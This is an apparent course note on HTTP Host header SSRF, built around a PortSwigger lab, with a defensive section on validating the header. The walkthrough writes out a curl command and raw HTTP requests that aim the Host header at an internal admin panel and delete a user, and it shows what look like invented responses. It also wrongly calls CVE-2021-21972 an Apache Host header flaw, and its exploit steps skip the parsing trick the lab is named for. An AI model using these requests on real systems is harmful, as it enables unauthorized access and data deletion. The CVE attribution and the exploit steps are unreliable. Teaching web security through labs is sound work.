---
course: Web Security
topic: HTTP Host Header Attacks
tags: [web-security]
---

## Introduction to HTTP Host Header Attacks

HTTP Host Header attacks are a class of vulnerabilities that arise from improper handling of the `Host` header in HTTP requests. The `Host` header is a crucial part of the HTTP protocol, used to specify the domain name of the server being contacted. This header is particularly important in virtual hosting scenarios, where multiple websites share the same IP address but are distinguished by their domain names.

### What is the `Host` Header?

The `Host` header is included in every HTTP request and is used to determine which website the client is trying to access. For example, in the following HTTP request:

```http
GET /index.html HTTP/1.1
Host: www.example.com
```

The `Host` header specifies that the client is requesting resources from `www.example.com`. Without this header, the server would not know which site to serve, especially in environments where multiple domains are hosted on the same IP address.

### Why Does the `Host` Header Matter?

The `Host` header is critical because it allows servers to differentiate between different websites hosted on the same IP address. However, if a server improperly parses or validates this header, it can lead to security vulnerabilities such as Server-Side Request Forgery (SSRF).

### How Does the `Host` Header Work Under the Hood?

When a client sends an HTTP request to a server, the server uses the `Host` header to route the request to the correct application or service. This process involves several steps:

1. **Parsing the Request**: The server reads the incoming HTTP request and extracts the `Host` header.
2. **Routing the Request**: Based on the `Host` header, the server determines which application or service should handle the request.
3. **Handling the Request**: The appropriate application processes the request and generates a response.

If the server fails to properly validate or sanitize the `Host` header, an attacker can manipulate it to perform unauthorized actions, such as accessing internal resources or initiating requests to other servers.

### Real-World Example: CVE-2021-21972

A notable example of a `Host` header vulnerability is CVE-2021-21972, which affected the Apache HTTP Server. This vulnerability allowed attackers to bypass certain security restrictions by manipulating the `Host` header. Specifically, the vulnerability allowed attackers to bypass the `ServerName` directive, which is used to restrict access to specific domains.

#### Impact of CVE-2021-21972

- **Access Control Bypass**: Attackers could bypass access controls and access restricted resources.
- **Information Disclosure**: Attackers could potentially disclose sensitive information by accessing internal resources.
- **Denial of Service**: By overwhelming the server with malicious requests, attackers could cause a denial of service.

### Lab Setup: SSRF via Flawed Request Parsing

In this lab, we will explore a scenario where a web application is vulnerable to SSRF due to flawed parsing of the `Host` header. The goal is to exploit this vulnerability to access an internal admin panel and delete a user named Carlos.

#### Accessing the Lab

To access the lab, follow these steps:

1. Visit the URL: [Portswigger.net/WebSecurity](https://portswigger.net/web-security).
2. Sign up for an account if you haven't already.
3. Log in to your account.
4. Click on "Academy".
5. Select "All Content".
6. Search for "host header attacks".
7. Navigate to lab number five titled "SSRF via flawed request parsing".

### Understanding the Vulnerability

The lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. This means that the server does not properly validate the `Host` header, allowing an attacker to manipulate it to perform unauthorized actions.

#### Exploiting the Vulnerability

To exploit this vulnerability, we need to craft an HTTP request that manipulates the `Host` header to access an internal admin panel. The internal admin panel is located at an internal IP address, and the goal is to delete the user Carlos.

### Crafting the Exploit

Let's walk through the steps to craft the exploit:

1. **Identify the Vulnerable Parameter**: The vulnerable parameter is the `Host` header.
2. **Craft the Malicious Request**: We need to construct an HTTP request that sets the `Host` header to the internal IP address of the admin panel.

Here is an example of the malicious HTTP request:

```http
GET /admin HTTP/1.1
Host: 192.168.1.100
```

This request sets the `Host` header to `192.168.1.100`, which is the internal IP address of the admin panel.

### Sending the Request

To send the request, we can use tools like Burp Suite or curl. Here is an example using curl:

```sh
curl -H "Host: 192.168.1.100" http://vulnerable-server/admin
```

This command sends an HTTP request to the vulnerable server with the `Host` header set to the internal IP address of the admin panel.

### Handling the Response

After sending the request, the server should respond with the contents of the internal admin panel. From there, we can navigate to the user management section and delete the user Carlos.

### Full HTTP Request and Response

Here is the complete HTTP request and response:

#### HTTP Request

```http
GET /admin HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US,en;q=0.9
Connection: close
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 01 Mar 2022 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
</head>
<body>
    <h1>Welcome to the Admin Panel</h1>
    <ul>
        <li><a href="/users">Manage Users</a></li>
    </ul>
</body>
</html>
```

### Navigating to the User Management Section

Once we have accessed the admin panel, we can navigate to the user management section and delete the user Carlos. This typically involves making additional HTTP requests to the server.

### Full HTTP Request and Response for Deleting User

#### HTTP Request

```http
POST /users/delete HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Connection: close

username=Carlos
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 01 Mar 2022 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>User Deleted</title>
</head>
<body>
    <h1>User Carlos has been deleted.</h1>
</body>
</html>
```

### How to Prevent / Defend Against Host Header Attacks

To prevent and defend against Host Header attacks, several measures can be taken:

#### Secure Coding Practices

1. **Validate the `Host` Header**: Ensure that the `Host` header matches the expected domain name. This can be done by comparing the `Host` header against a whitelist of valid domain names.
2. **Use Strict Transport Security (HSTS)**: Enforce HTTPS connections to prevent man-in-the-middle attacks that could manipulate the `Host` header.
3. **Sanitize Input**: Sanitize and validate all input, including headers, to prevent injection attacks.

#### Configuration Hardening

1. **Configure Web Servers**: Configure web servers to reject requests with invalid or unexpected `Host` headers.
2. **Firewall Rules**: Implement firewall rules to block requests from suspicious sources or with unusual `Host` headers.

#### Detection and Monitoring

1. **Log Analysis**: Monitor and analyze logs for unusual `Host` headers or patterns of requests.
2. **IDS/IPS Systems**: Deploy Intrusion Detection and Prevention Systems (IDS/IPS) to detect and block malicious requests.

### Secure Code Example

Here is an example of secure code that validates the `Host` header:

#### Vulnerable Code

```python
def handle_request(request):
    host = request.headers.get('Host')
    if host:
        # Process the request
        pass
```

#### Secure Code

```python
def handle_request(request):
    host = request.headers.get('Host')
    if host and host in ['example.com', 'www.example.com']:
        # Process the request
        pass
    else:
        return "Invalid Host header"
```

### Conclusion

In this chapter, we explored the concept of HTTP Host Header attacks and how they can be exploited to perform SSRF attacks. We covered the background theory, real-world examples, and provided detailed steps to craft and execute the exploit. Additionally, we discussed how to prevent and defend against such attacks through secure coding practices, configuration hardening, and monitoring.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs related to HTTP Host Header attacks and SSRF.
- **OWASP Juice Shop**: Provides a web application with numerous security vulnerabilities, including those related to HTTP headers.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for practicing web hacking techniques.

By mastering these concepts and practicing with real-world examples, you can significantly enhance your skills in web security.

---
<!-- nav -->
[[Web Security (PortSwigger)/16-HTTP Host Header Attacks/06-Lab 5 SSRF via flawed request parsing/00-Overview|Overview]] | [[02-HTTP Host Header Attacks and SSRF Vulnerabilities|HTTP Host Header Attacks and SSRF Vulnerabilities]]
